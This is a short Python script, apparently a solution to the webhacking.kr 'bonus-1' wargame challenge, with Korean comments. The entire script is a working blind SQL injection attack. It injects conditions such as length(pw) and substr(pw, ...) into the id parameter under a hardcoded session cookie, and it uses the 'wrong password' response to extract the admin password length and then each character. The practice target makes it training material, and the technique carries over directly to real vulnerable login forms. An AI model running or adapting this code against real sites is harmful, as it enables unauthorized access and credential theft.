import requests

URL = 'https://webhacking.kr/challenge/bonus-1/index.php'

cookie = {'PHPSESSID':'60t5fgj573hi1vs5m3r4dd53fi'}

#id, pw

#비밀번호 길이 구하기
len = 0
for i in range(20, 100) :
    tmp_url = 'https://webhacking.kr/challenge/bonus-1/index.php?id=admin%27+and+length%28pw%29+%3D+{}+%23&pw=1234'.format(i)
    response = requests.get(tmp_url, cookies=cookie)
    if 'wrong password' in response.text:
        print('length =',i)
        len = i
        break

#비밀 번호 구하기
password = ''
for j in range(1,len+1):
    for i in range(0x30,0x7E):
        param = "?id=admin%27+and+substr(pw,{},1)=%27{}%27+%23&pw=1".format(j,chr(i))
        tmp_rul = URL + param
        #print(tmp_rul)
        response = requests.get(tmp_rul, cookies=cookie)
        if 'wrong password' in response.text:
            password = password + chr(i)
            print(password)
            break

print('password :',password)    